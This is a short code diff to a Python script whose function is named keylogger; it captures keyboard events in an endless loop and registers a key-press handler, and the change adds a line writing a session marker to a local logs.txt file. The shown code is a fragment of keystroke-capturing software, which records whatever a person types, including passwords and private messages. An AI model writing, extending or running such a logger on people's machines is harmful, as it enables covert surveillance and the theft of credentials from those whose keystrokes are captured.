@@ -5,6 +5,8 @@ import datetime
 
 def keylogger():
     text = ''
+    with open("logs.txt", "a") as file:
+        file.write("Start session\n")
     while True:
         event = keyboard.read_event()
         if event.event_type == "down":
@@ -35,4 +37,3 @@ keyboard.on_press(on_key)
 
 if __name__ == '__main__':
     keylogger()
-    
